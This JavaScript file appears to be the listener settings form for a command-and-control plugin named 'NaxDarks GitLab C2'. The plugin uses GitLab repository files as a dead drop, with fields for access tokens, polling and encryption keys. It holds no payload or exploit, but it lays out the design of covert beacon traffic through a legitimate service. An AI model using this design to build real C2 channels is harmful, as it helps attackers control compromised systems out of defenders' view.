/// NaxDarks GitLab C2 — GitLab Repository Files dead-drop listener

function ListenerUI(mode_create)
{
    let labelURL = form.create_label("GitLab URL:");
    let editURL = form.create_textline();
    editURL.setPlaceholder("https://gitlab.com");
    editURL.setText("https://gitlab.com");
    editURL.setEnabled(mode_create);

    let labelToken = form.create_label("Access Token:");
    let editToken = form.create_textline();
    editToken.setPlaceholder("glpat-xxxxxxxxxxxxxxxxxxxx");
    editToken.setEnabled(mode_create);

    let labelProject = form.create_label("Project ID:");
    let editProject = form.create_textline();
    editProject.setPlaceholder("namespace/project  or  12345678");
    editProject.setEnabled(mode_create);

    let labelBranch = form.create_label("Branch:");
    let editBranch = form.create_textline();
    editBranch.setPlaceholder("main");
    editBranch.setText("main");

    let labelPath = form.create_label("Repo Path (optional):");
    let editPath = form.create_textline();
    editPath.setPlaceholder("c2/data  (leave empty for repo root)");

    let labelPoll = form.create_label("Poll Interval (s):");
    let spinPoll = form.create_spin();
    spinPoll.setRange(1, 3600);
    spinPoll.setValue(5);

    let labelEncKey = form.create_label("Encrypt Key:");
    let editEncKey = form.create_textline();
    editEncKey.setPlaceholder("32-char hex key (auto-generated if empty)");

    let labelPollAttempts = form.create_label("Beacon Poll Attempts:");
    let spinPollAttempts = form.create_spin();
    spinPollAttempts.setRange(1, 120);
    spinPollAttempts.setValue(15);

    let labelPollMs = form.create_label("Beacon Poll Interval (ms):");
    let spinPollMs = form.create_spin();
    spinPollMs.setRange(500, 60000);
    spinPollMs.setValue(3000);

    let layout = form.create_gridlayout();
    layout.addWidget(labelURL,          0, 0);
    layout.addWidget(editURL,           0, 1);
    layout.addWidget(labelToken,        1, 0);
    layout.addWidget(editToken,         1, 1);
    layout.addWidget(labelProject,      2, 0);
    layout.addWidget(editProject,       2, 1);
    layout.addWidget(labelBranch,       3, 0);
    layout.addWidget(editBranch,        3, 1);
    layout.addWidget(labelPath,         4, 0);
    layout.addWidget(editPath,          4, 1);
    layout.addWidget(labelPoll,         5, 0);
    layout.addWidget(spinPoll,          5, 1);
    layout.addWidget(labelEncKey,       6, 0);
    layout.addWidget(editEncKey,        6, 1);
    layout.addWidget(labelPollAttempts, 7, 0);
    layout.addWidget(spinPollAttempts,  7, 1);
    layout.addWidget(labelPollMs,       8, 0);
    layout.addWidget(spinPollMs,        8, 1);

    let container = form.create_container();
    container.put("gitlab_url",       editURL);
    container.put("access_token",     editToken);
    container.put("project_id",       editProject);
    container.put("branch",           editBranch);
    container.put("repo_path",        editPath);
    container.put("poll_interval",    spinPoll);
    container.put("encrypt_key",      editEncKey);
    container.put("poll_attempts",    spinPollAttempts);
    container.put("poll_interval_ms", spinPollMs);

    let panel = form.create_panel();
    panel.setLayout(layout);

    return {
        ui_panel: panel,
        ui_container: container,
        ui_height: 420,
        ui_width: 520
    }
}
